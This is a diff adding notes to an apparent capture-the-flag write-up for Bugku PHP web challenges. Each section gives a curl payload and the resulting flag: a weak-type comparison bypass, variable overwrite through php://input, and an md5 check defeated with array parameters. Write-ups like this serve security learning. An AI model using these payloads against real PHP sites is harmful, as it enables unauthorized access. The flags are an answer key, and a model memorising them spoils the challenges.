@@ -1038,3 +1038,57 @@ Connection: keep-alive
 Keep-Alive: timeout=60
 
 Flag: flag{bugku-dm-sj-a12JH8}
+
+
+=======================
+弱类型整数大小比较绕过
+=======================
+http://120.24.86.145:9009/22.php
+
+$temp = $_GET['password'];
+is_numeric($temp)?die("no numeric"):NULL;
+if($temp>1336){
+echo $flag;
+
+curl http://120.24.86.145:9009/22.php?password=9999a
+flag{bugku_null_numeric}
+
+
+
+=============================
+变量覆盖
+=============================
+http://120.24.86.145:9009/bianliang/
+
+curl -d "hello" "http://120.24.86.145:9009/bianliang/?a=hello&b=PHP://input"
+flag{num_test_administrator}
+
+
+========================
+md5()函数
+========================
+http://120.24.86.145:9009/18.php
+
+<?php
+error_reporting(0);
+$flag = 'flag{test}';
+if (isset($_GET['username']) and isset($_GET['password'])) {
+if ($_GET['username'] == $_GET['password'])
+print 'Your password can not be your username.';
+else if (md5($_GET['username']) === md5($_GET['password']))
+die('Flag: '.$flag);
+else
+print 'Invalid password';
+}
+?>
+
+curl -i "http://120.24.86.145:9009/18.php?username\[\]=112&password\[\]=111"
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 31 Jul 2018 13:29:25 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+Keep-Alive: timeout=60
+
+Flag: flag{bugk1u-ad8-3dsa-2}
